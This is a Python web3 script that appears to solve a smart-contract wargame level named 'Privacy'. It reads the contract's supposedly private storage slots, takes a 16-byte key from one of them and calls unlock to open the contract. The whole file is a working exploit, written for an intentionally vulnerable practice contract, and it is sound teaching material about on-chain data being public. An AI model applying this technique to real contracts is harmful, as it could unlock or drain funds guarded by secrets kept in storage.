from commom import get_w3, get_contract

def main():
    target_address = '0xcca3974D6C3701E230Ae0Bcba41809e76C025fd1'
    w3 = get_w3()
    # locked
    print(w3.eth.get_storage_at(target_address, 0).hex())
    # ID
    print(w3.eth.get_storage_at(target_address, 1).hex())
    # flattening 1 byte
    # denomination 1 byte
    # awkwardness 2 bytes
    print(w3.eth.get_storage_at(target_address, 2).hex())

    # bytes32 * 3
    data1 = w3.eth.get_storage_at(target_address, 3)
    data2 = w3.eth.get_storage_at(target_address, 4)
    data3 = w3.eth.get_storage_at(target_address, 5)
    print(data1.hex(), data2.hex(), data3.hex())

    # key is 16 bytes
    key = data3[0:16]
    print(key.hex())

    privacy = get_contract(contract_address=target_address, contract_name="Privacy")
    print(privacy.functions.locked().call())
    tx = privacy.functions.unlock(key).transact()
    receipt = w3.eth.wait_for_transaction_receipt(tx)
    print(privacy.functions.locked().call())

if __name__ == '__main__':
    main()